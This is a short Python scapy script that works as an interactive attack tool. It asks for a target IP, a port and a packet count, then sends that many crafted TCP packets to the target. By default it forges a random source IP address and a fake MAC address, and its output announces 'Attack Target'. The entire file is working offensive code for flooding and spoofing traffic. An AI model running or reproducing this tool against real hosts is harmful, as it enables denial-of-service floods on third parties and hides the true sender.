from scapy.all import *
from scapy.all import Ether
from colorama import *
import random,os,time
from datetime import datetime

try:
    os.system("cls")
    linux = False
except:
    os.system("clear")
    linux = True 
#colors
w = Fore.WHITE
r = Fore.RED
g = Fore.GREEN 
y = Fore.YELLOW
h = Fore.CYAN
b = Fore.BLUE
#

#time
n = datetime.now()
#

#message to send
m_packet = "Hello World!"
msg = m_packet.encode()
#

def attack(s_ip,s_port,d_ip,d_port,s_mac,c):
    print(" ")
    print(w + "[" + g + " * " + w + "]" + r + " Attack Target..")
    print(" ")
    time.sleep(3)
    print(r + "%s"%(n))
    print(h)
    pkt = (Ether(src=s_mac)/IP(src=s_ip,dst=d_ip)/TCP(sport=s_port,dport=int(d_port))/msg)
    sendp(pkt,count=int(c))

def home():
    print(w + "[" + g + " * " + w + "]" + y + " Started.")
    print(" ")
    print(w + "[" + g + " Target-IP " + w + "]")
    print(" ")
    d_ip = input(h + ">>>" + y + " ")
    print(" ")
    print(w + "[" + g + " Target-PORT " + w + "]")
    print(" ")
    d_port = input(h + ">>>" + y + " ")
    print(" ")
    print(w + "[" + g + " Count " + w + "]")
    print(" ")
    c = input(h + ">>>" + y + " ")
    print(" ")
    print(w + "[" + y + " Do you want to specify the source address?" + w + "]")
    print(" ")
    choise = input(h + "[y|n]" + y + " ")
    if(choise != "y" and choise != "yes" and choise != "n" and choise != "no"):
        print(w + "[" + r + " ! " + w + "]" + y + " This is not a command!")
        home()
    if (choise == "yes" or choise == "y"):
        print(" ")
        print(w + "[" + g + " Source-IP " + w + "]")
        print(" ")
        s_ip = input(h + ">>>" + y + " ")
        print(" ")
        print(w + "[" + g + " Source-Port " + w + "]")
        print(" ")
        s_port = input(h + ">>>" + y + " ")
        print(" ")
        print(w + "[" + g + " Source-MAC " + w + "]")
        print(" ")
        s_mac = input(h + ">>>" + y + " ")
        print(" ")
    if (choise == "no" or choise == "n"):
        s_ip = RandIP()
        s_port = 1234
        s_mac = "aa:bb:cc:dd:ee:ff"
    attack(s_ip,s_port,d_ip,d_port,s_mac,c)

home()
